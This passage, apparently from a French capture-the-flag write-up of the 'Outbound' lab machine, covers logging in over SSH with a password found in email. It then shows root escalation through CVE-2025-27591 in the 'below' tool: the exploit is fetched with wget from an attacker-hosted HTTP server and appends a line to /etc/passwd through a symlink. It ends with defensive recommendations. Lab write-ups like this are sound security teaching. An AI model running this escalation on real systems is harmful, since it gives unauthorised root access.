+Jacob,
+
+Tu as maintenant accès aux logs de monitoring via l'outil "Below".
+
+Informations importantes :
+- Répertoire des logs : /var/log/below/
+- Accès privilégié via sudo pour les opérations avancées
+- Documentation disponible avec 'man below'
+
+L'outil Below permet de surveiller les performances système et 
+d'analyser les métriques en temps réel.
+
+Pour toute question technique, contacte l'équipe système.
+
+Cordialement,
+Équipe Monitoring
+```
+
+**🔍 Informations critiques extraites des emails :**
+
+🔑 **Credentials SSH pour Jacob :**
+- **Username** : `jacob`
+- **Password** : `gY4Wr3a1evp4` ← **Critique pour la suite !**
+
+📊 **Information sur l'outil Below :**
+- **Répertoire** : `/var/log/below/` (confirmé world-writable par LinPEAS !)
+- **Accès privilégié** : Via `sudo` (indice majeur pour l'escalade)
+- **Purpose** : Monitoring système (outil légitime détournable)
+
+💡 **Significance tactique :**
+Ces emails confirment notre stratégie d'attaque :
+1. ✅ Accès SSH avec les credentials du premier email
+2. ✅ Escalade de privilèges via l'outil `below` mentionné dans le second
+
+![mail](/static/images/outbound/mail_below.png)
+
+3. ✅ Exploitation du répertoire `/var/log/below/` (world-writable)
+
+### Accès SSH
+
+```bash
+ssh jacob@10.10.11.77
+# Password: gY4Wr3a1evp4
+```
+
+**Flag user :**
+```bash
+jacob@outbound:~$ cat user.txt
+16a*************************189e
+```
+
+## Escalade de privilèges
+
+### Analyse des permissions sudo
+
+```bash
+jacob@outbound:~$ sudo -l
+User jacob may run the following commands on outbound:
+    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, 
+    !/usr/bin/below --debug*, !/usr/bin/below -d*
+```
+
+### Découverte de la vulnérabilité CVE-2025-27591
+
+Le binaire `below` est affecté par une vulnérabilité permettant l'écriture arbitraire de fichiers via symlink.
+
+### Exploitation
+
+**Étape 1 : Téléchargement du PoC sur la machine attaquante**
+
+```bash
+# Clonage du repository contenant l'exploit CVE-2025-27591
+git clone https://github.com/BridgerAlderson/CVE-2025-27591-PoC.git
+
+# Navigation dans le répertoire
+cd CVE-2025-27591-PoC
+
+# Vérification du contenu
+ls -la
+# exploit.py  README.md
+
+# Examen du script d'exploitation
+cat exploit.py | head -20
+```
+
+**Étape 2 : Mise en place d'un serveur HTTP pour le transfert**
+
+```bash
+# Démarrage d'un serveur HTTP Python sur la machine attaquante
+python3 -m http.server 80
+# Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+**Étape 3 : Téléchargement sur la machine cible**
+
+```bash
+# Navigation vers le répertoire vulnérable
+jacob@outbound:/var/log/below$ pwd
+/var/log/below
+
+# Téléchargement de l'exploit depuis notre serveur
+jacob@outbound:/var/log/below$ wget http://10.10.14.76/exploit.py
+--2025-08-05 18:40:01--  http://10.10.14.76/exploit.py
+Connecting to 10.10.14.76:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3255 (3.2K) [text/x-python]
+Saving to: 'exploit.py'
+
+# Attribution des permissions d'exécution
+jacob@outbound:/var/log/below$ chmod +x exploit.py
+
+# Vérification des permissions
+jacob@outbound:/var/log/below$ ls -la exploit.py
+-rwxr-xr-x 1 jacob jacob 3255 Aug  5 18:40 exploit.py
+```
+
+**Étape 4 : Exécution de l'exploit**
+
+```bash
+# Lancement de l'exploitation
+jacob@outbound:/var/log/below$ python3 exploit.py
+[*] Checking for CVE-2025-27591 vulnerability...
+[+] /var/log/below is world-writable.
+[!] /var/log/below/error_root.log is a regular file. Removing it...
+[+] Symlink created: /var/log/below/error_root.log -> /etc/passwd
+[+] Target is vulnerable.
+[*] Starting exploitation...
+[+] Wrote malicious passwd line to /tmp/attacker
+[+] Symlink set: /var/log/below/error_root.log -> /etc/passwd
+[*] Executing 'below record' as root to trigger logging...
+[+] 'below record' executed.
+[*] Appending payload into /etc/passwd via symlink...
+[+] Payload appended successfully.
+[*] Attempting to switch to root shell via 'su attacker'...
+root@outbound:/var/log/below# 
+```
+
+**Étape 5 : Vérification de l'élévation de privilèges**
+
+```bash
+# Vérification de notre identité
+root@outbound:/var/log/below# whoami
+root
+
+# Navigation vers le répertoire root
+root@outbound:/var/log/below# cd /root
+
+# Vérification du contenu
+root@outbound:~# ls -la
+total 28
+drwx------  4 root root 4096 Jun  8 15:39 .
+drwxr-xr-x 20 root root 4096 Jul 28 12:01 ..
+-rw-------  1 root root    5 Jun  8 15:39 .bash_history
+-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
+drwx------  2 root root 4096 Jun  8 15:39 .cache
+drwxr-xr-x  3 root root 4096 Jun  8 15:39 .local
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rw-------  1 root root   33 Jun  8 15:39 root.txt
+```
+
+**Flag root :**
+```bash
+root@outbound:~# cat root.txt
+fa9**************************fa6
+
+```
+
+## Conclusion
+
+### Récapitulatif des techniques utilisées
+
+1. **Reconnaissance** : Nmap, WhatWeb
+2. **Exploitation web** : CVE-2025-49113 (Roundcube RCE)
+3. **Post-exploitation** : Metasploit/Meterpreter
+4. **Cryptographie** : Analyse et déchiffrement Triple DES
+5. **Escalade de privilèges** : CVE-2025-27591 (Below symlink)
+
+### Points clés d'apprentissage
+
+- **Importance de la veille CVE** : Les vulnérabilités récentes sont souvent présentes
+- **Analyse cryptographique** : Comprendre les mécanismes de chiffrement pour extraire des credentials
+- **Symlink attacks** : Technique classique mais toujours efficace pour l'escalade de privilèges
+- **Persistence des données** : Les sessions utilisateur peuvent contenir des informations sensibles
+
+### Recommandations de sécurité
+
+1. **Mise à jour régulière** des applications web
+2. **Chiffrement robuste** des données sensibles
+3. **Principe du moindre privilège** pour les commandes sudo
+4. **Audit des permissions** sur les répertoires système
+5. **Monitoring** des accès aux fichiers critiques
+
+---
+
+*Cette machine démontre l'importance d'une approche méthodique en cybersécurité, combinant reconnaissance, exploitation, et analyse cryptographique pour aboutir à une compromission complète du système.*
